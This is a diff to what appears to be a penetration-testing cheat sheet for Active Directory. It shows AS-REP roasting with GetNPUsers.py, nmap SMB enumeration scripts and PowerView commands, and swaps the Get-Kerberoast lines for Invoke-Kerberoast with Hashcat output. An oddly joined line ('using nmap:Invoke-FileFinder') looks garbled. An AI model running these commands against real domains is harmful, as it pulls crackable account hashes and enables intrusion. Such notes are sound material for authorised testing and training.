@@ -44,7 +44,7 @@ GetNPUsers.py corp.local/ -usersfile valid_users.txt -dc-ip 192.168.1.10 -output
 
 Enumerate SMB(445,139):
 ```bash
-using nmap:
+using nmap:Invoke-FileFinder
 nmap -p 139,445 <target>
 nmap --script smb-os-discovery <target>
 nmap --script smb-security-mode <target>
@@ -267,7 +267,6 @@ Get-NetSession
 Get-NetUser -SPN
 Get-NetUser -Username <username>
 Get-ASREPRoast
-Get-NetUser -SPN | Get-Kerberoast
-Get-Kerberoast -OutputFormat Hashcat
+Invoke-Kerberoast -OutputFormat Hashcat 
 
 ```
